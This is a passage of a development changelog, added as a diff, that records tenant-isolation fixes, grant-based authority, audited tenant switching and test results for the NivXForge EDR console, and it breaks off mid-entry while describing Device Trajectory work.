+  (nonexistent token id, never called with an authorized tenant).
+- TENANT_SCOPED count 60 → **61** (11 SENSOR_SCOPED, 16 PRODUCT_METADATA,
+  88 classified total) — matches the owner's expected 61, no further
+  discrepancy found.
+- Live proof for the route: TENANT_REQUIRED (no header), precise NOT_FOUND /
+  NOT_ACTIVE for the privileged admin, A→B refused, B→A refused, and
+  unheld/nonexistent/ARCHIVED indistinguishable for the scoped analyst.
+  13/13 focused tests pass; completeness clause is GREEN again.
+- Zero-tenant live cell remains UNPROVEN LIVE / PREREQUISITE MISSING
+  (owner-approved). No account, no credential created.
+- STILL OPEN: fix-plan items 4 (SELECT CUSTOMER / `?tenant=` / localStorage),
+  5 (fail-open enforcement default + "default" residue), 6 (vendor/MSSP model).
+- PERMANENT REQUIREMENT (unchanged): after Tenant Authority closes, NivXForge
+  Device Trajectory returns to the Cisco Secure Endpoint / AMP operational-clone
+  target — publicly observable UI/UX, interactions, navigation and analyst
+  functionality, implemented independently on real NivXForge evidence.
+
+## 2026-06 · P0 TENANT AUTHORITY — FIX 4A DONE (single-customer UI authority)
+- The EDR console no longer renders "SELECT CUSTOMER" for a principal the
+  SERVER resolved to one customer. Decision comes from ONE authoritative
+  field, `active_customer.basis` out of `/api/xdr/rbac/session-context`
+  (`SINGLE_AUTHORIZED_TENANT`/`INHERITED_FROM_INCIDENT`/
+  `EXPLICIT_REQUEST_TENANT` ⇒ context only; `MULTIPLE_AUTHORIZED_TENANTS`/
+  `CROSS_TENANT_ROLE_NO_SINGLE_CUSTOMER` ⇒ picker kept as-is). NO role name
+  is inspected anywhere (that stays Fix 6).
+- New: `src/nivxforge/tenantContext.js` (decision), `components/
+  CustomerContext.jsx` (non-selectable pill, `data-testid=
+  nvf-customer-context`, `data-selectable="false"`).
+- `src/lib/tenant.js`: added a SERVER BINDING (`bindServerTenant`,
+  `serverBoundTenant`, `tenantIsSwitchable`, `TENANT_BOUND_EVENT`) that
+  outranks the browser; **`?tenant=` was REMOVED from the resolution order**
+  so it can never reach the `X-Tenant-Id` interceptor. A bound principal
+  ignores/overwrites a stale `nvx_tenant` and `setActiveTenant()` is a no-op
+  for it. A deep link is now ADOPTED as an explicit selection only when the
+  server says the principal may switch (minimum multi-tenant change made).
+- Console also gates page children on session-context resolution
+  (`nvf-tenant-resolving`) so no tenant-bound fetch fires with a stale
+  browser value, and `useIncidentContext()` subscribes to the binding.
+- Live preview proof (single-customer analyst + hostile `?tenant=default`
+  AND planted `localStorage.nvx_tenant=default`): no SELECT CUSTOMER,
+  context pill `nivx-live` / `SINGLE_AUTHORIZED_TENANT` / non-selectable,
+  the word "default" appears nowhere, no TENANT_NOT_AUTHORIZED banner,
+  storage corrected to `nivx-live`, nav works, `?tenant=` not re-attached.
+  Cross-tenant admin still gets the picker and deep-link adoption works.
+- Tests: vitest 65 passed (13 new, `src/lib/__tests__/tenantAuthority.test.js`);
+  backend untouched (`git diff backend/` empty) and fix1+fix2 hermetic suites
+  re-run 43 passed.
+- STILL OPEN: fix-plan items 5 (fail-open enforcement default + "default"
+  residue) and 6 (vendor/MSSP authority model, audited switching); live
+  zero-tenant cell; XDR-plane surfaces outside the EDR console.
+- PERMANENT REQUIREMENT (unchanged, do not weaken): after Tenant Authority
+  closes, NivXForge Device Trajectory returns to the Cisco Secure Endpoint /
+  AMP operational-clone target — publicly observable UI/UX, interactions,
+  navigation and analyst functionality, on real NivXForge evidence.
+
+## 2026-06 · P0 TENANT AUTHORITY — FIX 4B DONE (fail-closed authority)
+- `src/lib/tenant.js`: added `sealTenantAuthority()` / `tenantAuthoritySealed()`.
+  A SEALED authority makes `activeTenant()` return null and `setActiveTenant()`
+  a no-op, so on a resolution failure NOTHING may act as a customer — not
+  `?tenant=`, not `nvx_tenant`, not `"default"`, not the first tenant, not the
+  customer the browser was acting as a moment before. `bindServerTenant()`
+  unseals only on a successful server answer.
+- `src/nivxforge/tenantContext.js`: `contentGateFor(sessState, control)` →
+  RESOLVING (neutral) / AUTHORITY_UNAVAILABLE (fail closed, also when the
+  server resolves NOT_AUTHORIZED) / RENDER. The console seals during render
+  before children can mount.
+- New `components/CustomerAuthorityUnavailable.jsx` — "CUSTOMER AUTHORITY
+  UNAVAILABLE" + Retry, reusing the existing session-context fetch (no new
+  auth flow; 401 still goes through the api interceptor to /login). The topbar
+  shows `◇ NOT RESOLVED`, never another customer's name.
+- Live preview proof (session-context forced 503 + `?tenant=default` +
+  planted `localStorage=default`): fail-closed panel shown, zero tenant-bound
+  content, the word "default" absent everywhere, pill basis
+  AUTHORITY_UNAVAILABLE; Retry with the endpoint restored recovers to
+  `nivx-live` with no SELECT CUSTOMER.
+- Tests: vitest **76 passed** (24 in `tenantAuthority.test.js`, 11 new for 4B).
+  BACKEND UNCHANGED (`git diff backend/` empty).
+- STILL OPEN: Fix 5 (fail-open registry-enforcement default + backend
+  "default" residue) and Fix 6 (vendor/MSSP authority model + audited
+  switching); live zero-tenant cell; XDR-plane tenant UX.
+- PERMANENT REQUIREMENT (unchanged): after Tenant Authority closes, NivXForge
+  Device Trajectory returns to the Cisco Secure Endpoint / AMP
+  operational-clone target — publicly observable UI/UX, interactions,
+  navigation and analyst functionality, on real NivXForge evidence.
+## 2026-06 · P0 TENANT AUTHORITY — FIX 5A DONE (registry enforcement is an invariant)
+- `services/tenant_registry.py`: new `authoritative_required(tenant_id, purpose=)`
+  — reads NO environment flag, has no `compat_default`, never returns `"default"`,
+  never returns an unvalidated tenant. Requires: registered tenant + tenant
+  ACTIVE + organization registered + organization ACTIVE. A registry/DB lookup
+  failure is now a refusal (`REGISTRY_UNAVAILABLE`, 503), not a swallowed
+  exception. The legacy flag-gated `authoritative()` is kept for the
+  XDR/collector/ingest planes and simply DELEGATES when enforcing, so those
+  planes are byte-identical.
+- `routers/edr_tenancy.py`: `edr_tenant()` and `sensor_tenant()` now call
+  `authoritative_required()`. `routers/edr_enrollment.py::_agent_tenant()` (the
+  sensor enrolment/agent credential resolver, the only other EDR registry call
+  site) likewise; its generic-401 error-oracle rule is unchanged.
+- Result: `NIVX_TENANT_REGISTRY_ENFORCE` unset / `false` / `0` / `off` / `true`
+  all behave IDENTICALLY for EDR — there is no runtime state in which principal
+  authorization succeeds and registry validation is silently disabled.
+  Fix 2 non-disclosure is intact (unheld / unregistered / archived / registry
+  failure remain ONE opaque 403 for an unprivileged principal).
+- Tests: `tests/edr/test_p0_tenant_authority_fix5a.py` (new, A–M incl. every flag
+  value parametrised) + fix1 + fix2 + `test_b4b5_tenant_registry_authority.py`
+  → **131 passed, 0 failed**. No legacy test depended on EDR fail-open.
+  `backend/.env` NOT changed. No frontend change. No "default" residue touched.
+- STILL OPEN: Fix 5B (backend `"default"` residues — `authorised_incident()`,
+  `list_customers()`, `compat_default="default"`), Fix 6 (vendor/MSSP authority
+  model + audited switching); live zero-tenant cell; XDR-plane tenant UX.
+- PERMANENT REQUIREMENT (unchanged): after Tenant Authority closes, NivXForge
+  Device Trajectory returns to the Cisco Secure Endpoint / AMP
+  operational-clone target — publicly observable UI/UX, interactions,
+  navigation and analyst functionality, on real NivXForge evidence.
+## 2026-06 · P0 TENANT AUTHORITY — FIX 5B DONE (no implicit "default" fallback)
+- `services/session_context.py::authorised_incident()`: the terminal
+  `or "default"` is GONE. An incident naming neither `tenant_id` nor
+  `user_email` now returns the new state `INCIDENT_TENANT_UNRESOLVED` with
+  `doc=None` for EVERY principal (including cross-tenant), instead of being
+  attributed to the real registered tenant `default`. Legacy `user_email`
+  attribution and the existing `INCIDENT_TENANT_OUT_OF_SCOPE` /
+  `INCIDENT_NOT_FOUND` / `NOT_AUTHORIZED` states are unchanged.
+- `services/session_context.py::list_customers()`: group key is now
+  `tenant_id ?? user_email` with a `$match` dropping null/empty keys, so an
+  unattributed case can no longer manufacture a customer called `default`.
+- The REAL tenant `default` is untouched: not deleted, renamed, deactivated or
+  migrated. Live `/api/xdr/rbac/session-context` still lists
+  `customer=default` with identical counts (944 open / 944 total; 0 cases in
+  the corpus lack BOTH fields, so the removed branch was dead-but-dangerous).
+- `compat_default="default"` remains ONLY on the legacy flag-gated
+  `tenant_registry.authoritative()`, which no EDR path calls after Fix 5A —
+  XDR/collector/ingest semantics deliberately unchanged. XDR display-label
+  residues (`xdr_mss.py`, `incidents.py`, `xdr_respond_boundary.py`, the
+  vendor/cortex wizards) stay owner-fenced (T-RISK-3/4/5).
+- Tests: `tests/edr/test_p0_tenant_authority_fix5b.py` (new) + 5A + fix1 +
+  fix2 + `test_a05_tenant_scope_contract.py` → **185 passed, 0 failed**.
+- PRE-EXISTING failures (NOT caused by 5B, reported not rewritten):
+  `tests/test_edr_context_p0_f13_3.py` — 4 cases expect `/api/edr/context` 200
+  for a cross-tenant admin with no `X-Tenant-Id` (Fix 1 now returns 403
+  TENANT_REQUIRED) and 1 case asserts a stale snapshot count (241 vs the
+  current 944). Owner decision required before touching that file.
+- STILL OPEN: Fix 6 (vendor/MSSP authority model + audited switching); live
+  zero-tenant cell; XDR-plane tenant UX.
+- PERMANENT REQUIREMENT (unchanged): after Tenant Authority closes, NivXForge
+  Device Trajectory returns to the Cisco Secure Endpoint / AMP
+  operational-clone target — publicly observable UI/UX, process/relationship/
+  time rendering, process lifelines, parent/child navigation, event attachment,
+  before/after investigation, search/filter/MATCH navigation, zoom/pan,
+  evidence/raw/provenance inspection — on real NivXForge evidence.
+## 2026-06 · LEGACY TEST REPAIR — tests/test_edr_context_p0_f13_3.py (owner-approved)
+- TEST-ONLY change. PRODUCT CODE UNCHANGED (`git status` shows only the test
+  file). No data, no credentials, no frontend, no deploy.
+- The four `/api/edr/context` cases now present the REAL registered tenant
+  explicitly (`X-Tenant-Id: default`), matching the post-Fix-1 contract, and a
+  new case `test_context_without_tenant_context_is_refused` PINS
+  `403 TENANT_REQUIRED` + `fail_closed:true` + `authority:server` for a
+  cross-tenant principal with no tenant context, so the pre-Fix-1 implicit
+  behaviour cannot be reintroduced.
+- `test_context_xdr_pivot`: with the tenant now presented explicitly the
+  server reports `basis=EXPLICIT_REQUEST_TENANT` (previously
+  `INHERITED_FROM_INCIDENT`). The inheritance contract is still asserted:
+  `active_customer.value == investigation.tenant_id == "default"` and
+  `entry_context == XDR_PIVOT`.
+- `test_session_context`: the frozen `open_incidents == 241` snapshot is gone.
+  New invariants — `incidents >= 1`, `0 <= open_incidents <= incidents`,
+  every row has a real customer (Fix 5B), the queue_href matches the customer,
+  and session-context's count for `default` EQUALS `/api/xdr/mss/
+  customer-operations` for the same customer (both derive from the one
+  authoritative queue predicate `dashboard_lenses._scope`, which is the actual
+  product contract and stays true as live evidence changes).
+- Result: `test_edr_context_p0_f13_3.py` 7 passed (was 5 failed / 1 passed) and
+  fix1 + fix2 + 5A + 5B re-run green → **120 passed, 0 failed**.
+## 2026-06 · P0 TENANT AUTHORITY — FIX 6A DONE (inspection + contract only)
+- DESIGN ONLY. No authority code, role semantics, membership, grant, database,
+  frontend, switch API or audit persistence changed; no credential created;
+  live zero-tenant cell still UNPROVEN LIVE / PREREQUISITE MISSING.
+- Full report: `memory/production-gates/FIX6A_VENDOR_MSSP_AUTHORITY_DESIGN.md`.
+- Headline findings: cross-tenant authority is inferred from the free-text
+  `users.role` (`_CROSS_TENANT_ROLES` in `dashboard_lenses.py`), the EDR
+  CustomerPicker's selectable list is the WHOLE registry (`/api/xdr/tenants`,
+  `tenants.read`) rather than a grant set, there is NO successful-switch audit
+  event (refusals ARE audited as `ACCESS_DENIED`/`tenant_scope`, 442 live
+  rows), and `organization.kind = VENDOR/MSSP` is inert metadata.
+- Grant source already exists: `users.tenant_ids[]` → PROPOSED_DATA_MODEL_
+  CHANGE = NONE + one optional additive `platform_authority` marker. No second
+  authority store; `X-Tenant-Id` stays the requested-context input.
+- BLOCKING OWNER DECISION for Fix 6B: the 3 live `admin` + 1 `soc_manager`
+  principals hold no `tenant_ids[]`, so grants-first would remove their
+  customer authority — option (A) documented narrow platform-wide authority
+  for `platform_admin` (audited per resolution) vs (B) write explicit grants
+  (a data change needing approval).
+- PERMANENT REQUIREMENT (unchanged): immediately after Tenant Authority
+  closes, NivXForge Device Trajectory returns to the Cisco Secure Endpoint /
+  AMP operational-clone target — the real publicly observable UI/UX,
+  process/relationship/time rendering, process lifelines, parent/child
+  navigation, event attachment, before/after investigation, search/filter/
+  MATCH navigation, zoom/pan/scroll, evidence/raw/provenance inspection and
+  analyst workflow, implemented independently on real NivXForge evidence.
+  Not AMP-inspired, not a generic timeline.
+## 2026-06 · P0 TENANT AUTHORITY — FIX 6B-0 DONE (read-only live grant plan)
+- OWNER DECISION: Fix 6 uses OPTION B — explicit per-principal tenant grants
+  (`users.tenant_ids[]`). NO `platform_authority` bypass. Role = what you may
+  do; explicit grants = where. `soc_manager` and `mssp_operator` lose
+  automatic all-tenant breadth. `authorized_count` becomes grant-derived; the
+  picker reads `authorized_tenants[]` while the queue stays evidence-derived;
+  `organization.kind` stays NON-AUTHORITATIVE; G6-7 deferred.
+- READ-ONLY step. DATA_CHANGED = NO, CODE_CHANGED = NO (git clean).
+  Full plan: `memory/production-gates/FIX6B0_LIVE_GRANT_PLAN.md`.
+- 4 live role-based multi-tenant principals found. Proposed (NOT applied):
+  `admin@nivxray.com` → ["default","nivx-live"] (VENDOR INTERNAL, org
+  "NivXMachines (Preview)" kind VENDOR; 100+8 audit rows, 318 endpoints, all
+  sampled raw events, 20 own/assigned cases); `p0a-approver@nivxray.com` →
+  ["default"] (HIGH, already carries tenant_id=default);
+  `approver@nivxray.com` → ["default"] (MEDIUM, documentation-only evidence);
+  `a05-admin-37051a53@nivxray.test` → UNRESOLVED (zero evidence, a05 fixture
+  residue). The other 40 tenants in the admin audit trail are gate/test
+  fixtures and are deliberately NOT proposed.
+- Fix 6B dependency flagged: `tests/test_a05_tenant_scope_contract.py` seeds a
+  role-only `admin` and asserts cross-tenant outcomes; under grants-first that
+  FIXTURE must seed explicit tenant_ids (test change, not product weakening).
+- NEXT: Fix 6B-1 = write ONLY the approved grants (idempotent, no other field,
+  no credential) and re-report resolved scope, with NO authority-code change;
+  grants-first enforcement + audited switch become Fix 6B-2.
+- PERMANENT REQUIREMENT (unchanged): the moment Tenant Authority closes,
+  NivXForge Device Trajectory returns to the Cisco Secure Endpoint / AMP
+  operational-clone target — real publicly observable Cisco-class UI/UX,
+  process/relationship/time interaction, lifelines, parent/child navigation,
+  event attachment, before/after investigation, MATCH navigation, zoom/pan,
+  evidence/provenance inspection — on real NivXForge evidence.
+## 2026-06 · P0 TENANT AUTHORITY — FIX 6B-1 DONE (approved grant write only)
+- DATA PREPARATION ONLY via `/app/scripts/fix6b1_grant_write.py` (idempotent;
+  second run = NO_OP on all three). ONE field written (`users.tenant_ids`) on
+  three principals; registry validated first (both tenants ACTIVE under the
+  ACTIVE VENDOR org `nivxmachines-preview`).
+  - `admin@nivxray.com`        → ["default","nivx-live"]  (owner-approved)
+  - `p0a-approver@nivxray.com` → ["default"]
+  - `approver@nivxray.com`     → ["default"]
+  - `a05-admin-37051a53@nivxray.test` → UNTOUCHED (no tenant_ids)
+- Proof: users total 76 before/after; no other principal's `tenant_ids`
+  changed; role/tenant_id/password untouched (all three still log in 200);
+  the ~40 fixture tenants were NOT granted.
+- AUTHORITY_CODE_CHANGED = NO, FRONTEND_CHANGED = NO, TESTS_CHANGED = NO.
+  Legacy role→all_tenants breadth therefore still exists (a cross-tenant probe
+  to the fixture tenant `probe-t-00bf71` still returns 200) — expected until
+  Fix 6B-2 removes the inference.
+- NEXT (Fix 6B-2, bounded): grants-first `resolve_tenant_scope()` /
+  `authorize_requested_tenant()`, retire `_CROSS_TENANT_ROLES` inference,
+  grant-derived `authorized_count`, `TENANT_CONTEXT_SWITCHED` audit via the
+  existing `xdr_audit_log`; role-only-admin FIXTURES (starting with
+  `tests/test_a05_tenant_scope_contract.py`) seed their own explicit
+  tenant_ids then. Picker-from-grants UI comes after 6B-2.
+- PERMANENT REQUIREMENT (unchanged): immediately after Tenant Authority
+  closes, return to the Cisco Secure Endpoint / AMP Device Trajectory
+  operational-clone target — process lifelines, parent/child relationships,
+  time-based trajectory, attached DNS/network/file/registry activity,
+  detection markers, before/after navigation, event/detection focus,
+  search/filter/MATCH navigation, smooth zoom/pan/scroll, evidence/raw/
+  provenance inspection and the real analyst investigation workflow, on real
+  NivXForge evidence.
+## 2026-06 · FIX 6B-2 DESIGN AMENDMENT (authority classes) — design only
+- OWNER DECISION: `admin@nivxray.com` is the initial NIVX PLATFORM SUPER ADMIN
+  by EXPLICIT designation — never inferred from `role == admin`. Three classes:
+  CUSTOMER USER/ANALYST, CUSTOMER ADMIN (admin rights only inside granted
+  customers), NIVX PLATFORM SUPER ADMIN (platform scope).
+- CODE_CHANGED = NO, DATA_CHANGED = NO. Full design:
+  `memory/production-gates/FIX6B2_AUTHORITY_SCOPE_DESIGN.md`.
+- Proposed representation: ONE additive field `users.authority_scope ∈
+  {CUSTOMER, PLATFORM}`, absent ⇒ CUSTOMER. No is_super_admin/superuser/
+  global_access/persisted all_tenants. Never inferred from role, tenants.read,
+  organization.kind, tenant_ids length, picker or X-Tenant-Id. Unsettable from
+  the browser (the ONLY `users` write in the backend is the password change at
+  `routers/auth.py:81`; the principal doc is re-read per request).
+- `tenant_ids[]` stays the CUSTOMER breadth and is NEVER filled with the
+  registry; admin keeps ["default","nivx-live"] as stated operational context.
+- Fix 6B-2 plan: delete `_CROSS_TENANT_ROLES`; `all_tenants` kept as a value
+  DERIVED only from PLATFORM scope so the 4 existing consumers (incl. the
+  deferred G6-7 `xdr_rbac.authorize_tenant`) need no change; grant-derived
+  `authorized_count`; `TENANT_CONTEXT_SWITCHED` audit emitted from the small
+  `POST /api/edr/session/active-tenant`; refusal auditing untouched.
+- ORDERING RULE: Fix 6B-1b (write `authority_scope: "PLATFORM"` on
+  admin@nivxray.com only) MUST land BEFORE the 6B-2 enforcement flip, or the
+  owner account degrades to CUSTOMER scope.
+- A05 + other role-only-admin FIXTURES seed their own `authority_scope`/
+  `tenant_ids` during 6B-2; the CUSTOMER-admin refusal case
+  (grants [default,nivx-live] → probe-t-00bf71 REFUSED) is proven with a
+  hermetic stubbed principal, no new live credential.
+- RECORDED, NOT BUILT: a PLATFORM Super Admin must eventually land on the
+  NIVX SUPER ADMIN CONTROL CENTER (cross-customer tenants/health/EDR/XDR/
+  endpoints/sensor/telemetry/detections/integrations/pipeline/policy/service/
+  deployment/authority-failure/audit/drill-down/controls, evidence-backed
+  only, explicit UNKNOWN where telemetry is absent) — NOT an expanded customer
+  picker, and NOT before Device Trajectory.
+- OPEN QUESTIONS: PLATFORM `authorized_count` = ACTIVE registered tenants?
+  rename `CROSS_TENANT_ROLE_NO_SINGLE_CUSTOMER` now or later? explicit
+  `"CUSTOMER"` on the approver accounts? confirm 6B-1b ordering.
+- PERMANENT REQUIREMENT (unchanged): immediately after Tenant Authority
+  closes, return to the Cisco Secure Endpoint / AMP Device Trajectory
+  operational-clone target on real NivXForge evidence.
+## 2026-06 · P0 TENANT AUTHORITY — FIX 6B-1b DONE (PLATFORM designation only)
+- OWNER DECISIONS recorded: (1) PLATFORM `authorized_count` = tenants that are
+  ACTIVE under an ACTIVE organization, informational ONLY — it never grants
+  authority; (2) the six locked `SCOPE_BASES` stay unchanged in 6B-2, the
+  `CROSS_TENANT_ROLE_NO_SINGLE_CUSTOMER` rename is CLEANUP DEBT for after the
+  gate closes; (3) do NOT write `"CUSTOMER"` anywhere — absent/null/malformed
+  ⇒ CUSTOMER is the least-authority default and PLATFORM stays exceptional and
+  explicit; (4) 6B-1b runs as its own micro-step before 6B-2.
+- `/app/scripts/fix6b1b_platform_designation.py` (idempotent; refuses unless
+  the Fix 6B-1 grants are present and unchanged) wrote ONE field on ONE
+  principal: `admin@nivxray.com` → `authority_scope: "PLATFORM"`.
+- Proof: `tenant_ids` still ["default","nivx-live"]; role `admin` unchanged; no
+  other field on the document changed; `authority_scope` holders = exactly
+  {admin@nivxray.com: PLATFORM} across all 76 users; login 200 and
+  `/api/edr/endpoints` (X-Tenant-Id: default) 200.
+- CODE_CHANGED = NO (script only, no product code). Enforcement untouched —
+  session-context still reports the legacy role-derived
+  `all_tenants:true / tenant_ids:[]` with basis
+  `CROSS_TENANT_ROLE_NO_SINGLE_CUSTOMER`, which is exactly the pre-6B-2
+  baseline.
+- NEXT: Fix 6B-2 enforcement (grants-first + `authority_scope`), then the
+  audited switch, then picker-from-grants. PERMANENT REQUIREMENT unchanged:
+  immediately after Tenant Authority closes, return to the Cisco Secure
+  Endpoint / AMP Device Trajectory operational-clone target on real NivXForge
+  evidence.
+## 2026-06 · P0 TENANT AUTHORITY — FIX 6B-2 DONE (grants-first + PLATFORM scope + switch audit)
+- `services/dashboard_lenses.py`: `_CROSS_TENANT_ROLES` DELETED as authority
+  (retained only as the documentation constant
+  `_LEGACY_ROLE_BREADTH_RETIRED`, read by no decision). New
+  `authority_scope(user)` → PLATFORM iff the stored string is exactly
+  "PLATFORM"; absent/null/"CUSTOMER"/"platform"/"platform_admin"/True/1/
+  lists/dicts ⇒ CUSTOMER. `resolve_tenant_scope()` now returns
+  `{authority_scope, all_tenants(=PLATFORM only), tenant_ids(=grants), role}`.
+- `services/session_context.py`: breadth source is scope+grants (refusal codes
+  and Fix 2 non-disclosure untouched); new `_authorized_universe()` makes
+  `authorized_count` AUTHORITY-derived — CUSTOMER = grants that survive
+  `authoritative_required()`, PLATFORM = tenants ACTIVE under an ACTIVE org
+  (informational only, fail-closed to 0 on registry failure);
+  `tenant_context()` now publishes `tenant_scope.authority_scope`.
+- `routers/edr_session.py` (NEW, ~90 lines) + `server.py` wiring:
+  `POST /api/edr/session/active-tenant`, authority via `Depends(edr_tenant)`,
+  writes `TENANT_CONTEXT_SWITCHED` to the existing `xdr_audit_log` chain with
+  principal, authority_scope, before/after tenant, basis, requested tenant,
+  correlation_id and outcome. Previous context is read back from the audit
+  chain (no new store); when unknown it records `NOT_AVAILABLE` rather than
+  inventing it. A repeat of the same context writes nothing
+  (`switch_recorded:false, reason:NO_CONTEXT_CHANGE`).
+- FIXTURE REPAIRS (test-only, intent preserved, no live grant used):
+  `test_a05_tenant_scope_contract.py` (U_ADMIN seeded
+  `authority_scope:PLATFORM`; T_ACME/T_CONTOSO adopted into the registry so a
+  PLATFORM universe can report them), `test_p01_response_evidence_write_
+  tenant_authority.py`, `test_p0_response_execution_tenant_scope.py`,
+  `test_s1_incident_subresource_authz.py` (each replaced the hardcoded
+  `admin@nivxray.com` cross-tenant principal with its own prefixed PLATFORM
+  fixture principal).
+- TESTS: new `tests/edr/test_p0_tenant_authority_fix6b2.py` (A–X, 40 cases) →
+  focused batch **215 passed, 0 failed**; `test_a05_tenant_scope_contract.py`
+  **72 passed** (was 5 failed).
+- LIVE PREVIEW: admin@nivxray.com → `authority_scope: PLATFORM` (not role),
+  default + nivx-live 200, no header = 403 TENANT_REQUIRED (never "default"),
+  switch nivx-live→default audited (2 rows, chained), repeat = NO_CONTEXT_
+  CHANGE, unregistered tenant refused. `p0a-approver@` and `approver@` are now
+  CUSTOMER/["default"]: default 200, nivx-live 403, probe-t-00bf71 403 (they
+  previously had role-derived access to everything). Frontend untouched, login
+  page smoke-verified.
+- NOTE: `probe-t-00bf71` now returns 200 for admin because it is a REGISTERED
+  ACTIVE tenant and admin is legitimately PLATFORM; the CUSTOMER-admin refusal
+  of an ungranted tenant is proven hermetically (cases B/E/I), never with the
+  live PLATFORM account.
+- CLEANUP DEBT: `SCOPE_BASES` still says `CROSS_TENANT_ROLE_NO_SINGLE_CUSTOMER`
+  for a PLATFORM principal (owner-decided rename after the gate closes);
+  G6-7 `xdr_rbac.authorize_tenant` parity still deferred.
+- NEXT: Picker From Grants (UI reflects grants/PLATFORM), then remaining
+  closure items (live zero-tenant cell). PERMANENT REQUIREMENT unchanged:
+  immediately after Tenant Authority closes, return to the Cisco Secure
+  Endpoint / AMP Device Trajectory operational-clone target on real NivXForge
+  evidence.
+## 2026-06 · PICKER FROM GRANTS DONE (UI reflects the 6B-2 authority model)
+- `services/session_context.py`: new `authorized_customers(email)` +
+  `session-context.authorized_customers[]` — AUTHORITY-derived (CUSTOMER =
+  registry-validated `tenant_ids[]`; PLATFORM = authoritative ACTIVE tenants
+  under ACTIVE orgs), with display_name/slug/kind. Evidence-derived
+  `customers[]` is unchanged for the queue panels.
+- `components/CustomerPicker.jsx`: REWIRED. No `GET /api/xdr/tenants`, no
+  `api.get` at all, no localStorage/`?tenant=`/"default"/role strings in the
+  component. List = `authorized_customers` prop. Selection calls the audited
+  `POST /api/edr/session/active-tenant` FIRST and only persists locally after
+  the server confirms; a refusal renders `nvf-customer-refusal` and changes
+  nothing. PLATFORM principals get a `nvf-platform-badge` and the menu header
+  `AUTHORITATIVE ACTIVE CUSTOMERS · PLATFORM AUTHORITY`.
+- `tenantContext.js`: added `authorityScope()`, `isPlatformPrincipal()`,
+  `authorizedCustomers()`; PLATFORM is read ONLY from
+  `tenant_scope.authority_scope` (breadth ≠ designation). Fix 4A/4B control +
+  content gates untouched.
+- TESTS: new `src/lib/__tests__/pickerFromGrants.test.js` (A–J) →
+  **vitest 39 passed** (15 new + 24 existing); backend focused
+  **59 passed**.
+- LIVE: single-grant approver → EDR opens on `default`, NO picker and NO
+  "SELECT CUSTOMER" even with `?tenant=probe-t-00bf71` + stale
+  `nvx_tenant=nivx-live`. PLATFORM admin → picker + PLATFORM badge, 136
+  authorized customers offered (60 rendered, filter works), selecting
+  nivx-live wrote `TENANT_CONTEXT_SWITCHED` (3 chained rows, source
+  `nivxforge-edr`) and the header now reads "Preview Live Sources"; PLATFORM
+  with nothing selected stays PLATFORM and shows an honest TENANT_REQUIRED
+  banner instead of silently using `default`.
+- STILL OPEN (assess whether these are real closure blockers): live
+  zero-tenant cell, `SCOPE_BASES` terminology cleanup, G6-7 XDR parity.
+- PERMANENT REQUIREMENT: Device Trajectory (Cisco Secure Endpoint / AMP
+  operational clone — process lifelines, parent/child, attached activity,
+  before/after navigation, search/filter, event/detection focus, evidence/raw/
+  provenance inspection, process/activity/behavior trees, bidirectional
+  pivots) resumes IMMEDIATELY once Tenant Authority closes.
+## 2026-06 · P0 TENANT AUTHORITY — GATE CLOSED (assessment only, no code/data change)
+- Full assessment: `memory/production-gates/TENANT_AUTHORITY_CLOSURE_ASSESSMENT.md`.
+- DECISION: **TENANT_AUTHORITY_CLOSED**. 24 of 25 invariants (A–Y) PROVEN with
+  cited hermetic + live evidence; Y (PLATFORM does not bypass RBAC/response
+  approval) is PARTIALLY_PROVEN — separate layers, RBAC untouched by 6B-2,
+  one focused case would close it. GENUINE_SECURITY_BLOCKERS: NONE.
+- ZERO_TENANT_LIVE_CELL = ACCEPTABLE_DEFERRED_LIVE_PROOF (zero-grant behaviour
+  proven in fix1/fix2/6B-2; the live cell is env-gated by P0-PROD-1, and five
+  zero-grant principals ALREADY exist so it could be filled without creating a
+  credential).
+- BASIS_RENAME = NON_BLOCKING_CLEANUP (`CROSS_TENANT_ROLE_NO_SINGLE_CUSTOMER`
+  affects no decision, audit row, enumeration or UI authority; 9 files).
+- NON_BLOCKING_DEBT: zero-tenant live cell, basis rename, G6-7 XDR parity,
+  invariant-Y focused case, 3 stale `bob-sec003-*` zero-grant live rows with a
+  test-constant password + 2 a05 residue rows (deletion needs approval),
+  picker renders 60 of 136 authorized customers, no `users` schema validator.
+- NEXT IMPLEMENTATION TASK (owner-approved): **DT2-3 — VISIBLE DEVICE
+  TRAJECTORY RELATIONSHIPS** (Cisco Secure Endpoint / AMP operational clone):
+  horizontal time, process lifelines, parent/child rendering, attached DNS /
+  NETWORK / FILE / REGISTRY activity, detection markers where real evidence
+  exists, process selection, parent/child + before/after navigation, exact
+  event/detection focus, evidence-backed WHY/basis, and NO invented
+  relationships / process exits / activity. Trajectory Inspector follows as
+  its own step; NIVX SUPER ADMIN CONTROL CENTER stays parked.
+- Final manual acceptance identities to keep: PLATFORM Super Admin, Customer
+  Admin, Customer Analyst, preferably a second-customer Analyst.
+## 2026-06 · DT2-3 DONE — VISIBLE DEVICE TRAJECTORY RELATIONSHIPS
+- Backend (additive, 1 hunk): `routers/edr.py` now serves the DT2-2E render
+  contract at `dt2.graph` on `GET /api/edr/endpoints/{id}/trajectory`
+  (process_nodes, activity_nodes, edges, root_node_ids, order, navigation,
+  availability, ranges, focus). V1 keys untouched; no second engine.
+- Frontend: new `trajectory/dt2/graphModel.js` (pure selectors: lane order,
+  lifelineOf, activitiesFor, parentOf/childrenOf, edgeFor, whyOf, stepsOf/
+  neighbourStep, focusOf, familiesPresent) + new
+  `trajectory/RelationshipCanvas.jsx` (+`RelationshipBasis` rail) +
+  `EdrDeviceTrajectoryPage.jsx` mode toggle
+  "PROCESS / RELATIONSHIP / TIME" (default) vs "EVENT LANES".
+- Semantics enforced: dashed span = OBSERVED_EVIDENCE_SPAN (exit only drawn
+  when `exit_observed`); a connector is drawn ONLY where `edgeFor()` finds a
+  server edge; activity glyphs (DNS ▲ / NETWORK ■ / FILE ◆ / REGISTRY ●) plot
+  at their OWN ordering_time on the owning process; BEFORE/AFTER walks
+  `navigation.ordered_step_ids` and surfaces `link_to_previous`
+  (CAUSALITY_UNKNOWN stays unknown); focus is exact or explicitly unresolved;
+  lanes capped by `MAX_RENDERED_LANES` (120) and the canvas issues no requests.
+- Tests: new `dt2/__tests__/graphModel.test.js` (A–T, 24 cases) → vitest
+  **115 passed**; new `tests/edr/test_dt2_3_graph_read.py` (10) + DT2-0/1/2E +
+  6B-2 → **165 passed**. `vite build` clean.
+- LIVE (real Windows endpoint `dev_0e10780f2c86` / WS-W1-1789575060, tenant
+  default): GRAPH_READY, **16 process lanes, 13 parent/child connectors, 1
